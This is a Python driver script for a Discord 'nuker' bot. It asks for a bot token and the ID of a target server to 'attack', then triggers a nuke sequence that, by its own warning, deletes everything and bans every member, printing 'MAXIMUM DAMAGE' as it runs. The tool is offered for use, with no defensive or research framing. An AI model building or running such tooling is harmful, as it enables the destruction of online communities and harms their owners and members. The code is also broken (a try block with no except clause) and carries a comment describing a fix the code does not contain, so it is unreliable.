import asyncio
from core_bot import NukerEngine
from config import GUILD_OVERWRITE_NAME

async def get_user_input(prompt: str, input_type=str) -> any:
    """Handles prompts and input casting."""
    while True:
        user_input = input(f"{prompt}: ").strip()
        if not user_input:
            print("Input cannot be empty.")
            continue

        try:
            if input_type == int:
                return int(user_input)
            elif input_type == bool:
                return user_input.lower() in ('y', 'yes')
            else:
                return user_input
        except ValueError:
            print("Invalid input format. Please try again.")

async def main():
    """Main function to orchestrate the bot process."""
    engine = NukerEngine()

    bot_token = None
    while not bot_token:  # Fixed: changed 'bot_token' to 'bot' to match the code logic
        bot_token = await get_user_input("Enter YOUR Bot Token (The secret key)", input_type=str)
        if bot_token:
            print(f"Attempting login with token...")
            await engine.initialize_bot(bot_token)
            break

    guild_id = None
    while not guild_id:
        try:
            g_id_input = await get_user_input("Enter the TARGET Guild ID (The server to attack)", input_type=int)
            if g_id_input > 0:
                guild = engine.bot.get_guild(g_id_input)
                if guild:
                    guild_id = g_id_input
                    print(f"🔍 Found connected to: {guild.name}")
                else:
                    print("⚠️ Bot might not have instant access to the guild cache. Assuming ID is correct.")
                    guild_id = g_id_input
                    break
            else:
                pass

    if guild_id:
        confirm_execute = await get_user_input(
            f"WARNING: This bot will delete everything and ban everyone in '{GUILD_OVERWRITE_NAME}' (ID: {guild_id}). Proceed? (yes/no)", 
            input_type=bool
        )

        if confirm_execute:
            print("\n=======================================")
            print("⚔️ EXECUTION TRIGGERED! STAND BACK FOR MAXIMUM DAMAGE ⚔️")
            print("=====================================\n")
            await engine.execute_nuke_sequence(guild_id)
        else:
            print("\nOperation cancelled by the user.")
    else:
        print("\nCould not find a valid Guild ID to operate on. Exiting.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\n[SYSTEM] Nuker process interrupted manually by the user. Shutting down gracefully.")
